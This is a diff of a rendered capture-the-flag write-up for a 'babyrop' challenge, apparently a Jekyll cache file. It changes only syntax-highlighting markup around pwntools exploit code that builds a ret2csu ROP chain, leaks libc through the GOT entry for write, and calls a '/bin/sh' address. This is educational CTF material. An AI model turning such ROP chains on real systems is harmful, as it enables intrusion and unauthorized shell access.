@@ -1,4 +1,4 @@
-I"Ž6<h2 id="challenge-description">Challenge Description</h2>
+I"Ö6<h2 id="challenge-description">Challenge Description</h2>
 <p><img src="/assets/images/challdesbabyrop.png" alt="" /></p>
 
 <h3 id="solution">Solution:</h3>
@@ -67,7 +67,7 @@ rdx - size of the buffer = &gt;8
 </code></pre>
 <p>Hmmm :(. Seems like there is a compare statement thatâ€™ll make us jump back to the csu+64 (which is somewhere in the middle of csu). Now lets make rbp as 1 so we dont take the jump.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buf</span> <span class="o">=</span> <span class="s">b"a"</span><span class="o">*</span><span class="mi">72</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mi">72</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011ca</span><span class="p">)</span> <span class="c1">#rbx rbp r12 r13 r14 r15
 </span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011b0</span><span class="p">)</span>
@@ -122,7 +122,7 @@ rdx = size
 
 <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
 
-<span class="n">buf</span> <span class="o">=</span> <span class="s">b"a"</span><span class="o">*</span><span class="mi">72</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mi">72</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011ca</span><span class="p">)</span> <span class="c1">#rbx rbp r12 r13 r14 r15
 </span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011b0</span><span class="p">)</span> 
@@ -139,7 +139,7 @@ rdx = size
 
 <span class="n">binsh</span> <span class="o">=</span> <span class="n">leak</span><span class="o">+</span><span class="mh">0xa63da</span>
 
-<span class="n">buf</span> <span class="o">=</span> <span class="s">b"a"</span><span class="o">*</span><span class="mi">72</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mi">72</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40116b</span><span class="p">)</span> <span class="c1">#ret
 </span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011d3</span><span class="p">)</span> <span class="c1">#pop rdi 
 </span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
